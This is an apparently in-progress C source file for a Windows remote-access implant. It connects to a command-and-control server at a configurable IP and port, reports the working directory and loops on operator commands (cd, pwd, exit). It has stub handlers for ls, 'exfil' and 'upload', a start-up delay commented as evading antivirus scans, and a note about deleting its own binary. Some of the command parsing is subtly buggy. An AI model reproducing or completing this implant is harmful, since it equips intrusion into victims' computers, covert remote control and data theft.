#include "c2_net.h"
#include <windows.h>
#include <stdlib.h>
#include <malloc.h>
#include <string.h>
#include <shlwapi.h>
#include <pathcch.h>

#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "Pathcch.lib")

// Configurations
#define SLEEP 1
#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 8080

// Present working directory, globally accessible
char pwd[_MAX_PATH + 1] = {0};

// Attempt to change the pwd to the given path. Returns FALSE if path does not exist.
BOOL change_dir(char *path, int len) {

    // Absolute path
    if(len >= 3 && path[1] == ':' && PathIsDirectoryA(path)) {
        memset(pwd, 0, _MAX_PATH + 1);
        strncpy(pwd, path, len);
        PathCchAddBackslash(pwd, _MAX_PATH+1); // Append trailing \ to path
        return TRUE;
    }
    // No support for relative paths
    return FALSE;
    
}

// cl implant.c c2_net.c /Fe:implant.exe /DDEBUG
// cl implant.c c2_net.c /Fe:implant.exe
int main() {

    // Sleep on start to avoid AV scans
    Sleep(SLEEP * 1000);

    // Basic setup
    if (!setup_comms()) {
        return 1;
    }

    // Connect to C2 server (TODO: what to do if can't connect?)
    SOCKET c2_sock = c2_connect(SERVER_IP, SERVER_PORT);
    if (c2_sock == INVALID_SOCKET) {
        closesocket(c2_sock);
        WSACleanup();
        return 1;
    }

    // Get present directory
    GetCurrentDirectory(_MAX_PATH, pwd);
    c2_send(c2_sock, pwd, strlen(pwd));

    int len = 0;
    char buffer[512];
    while (TRUE) {
        // Get data
        len = c2_recv(c2_sock, buffer, 511);
        if (len == SOCKET_ERROR)
            continue;
        c2_log("%s\n", buffer);

        // Main logic of implant functionality
        if (strncmp(buffer, "exit", 4) == 0) {
            break;
        }
        else if(strncmp(buffer, "cd ", 3) == 0 && len >= 4) {
            if (! change_dir(buffer + 3, len - 3)) // buffer + 3 is start of argument passed to cd
                c2_send(c2_sock, "Invalid dir", 11);
        }
        else if(strncmp(buffer, "ls", 2) == 0) {

        }
        else if(strncmp(buffer, "pwd", 2) == 0) {
            c2_send(c2_sock, pwd, strlen(pwd));
        }
        else if(strncmp(buffer, "exfil ", 5) == 0) {
            
        }
        else if(strncmp(buffer, "upload ", 6) == 0) {
            
        }
        // TODO: what else?

        

    }

    // Close the socket
    closesocket(c2_sock);
    WSACleanup();
    return 0;
    // TODO: delete binary?
}
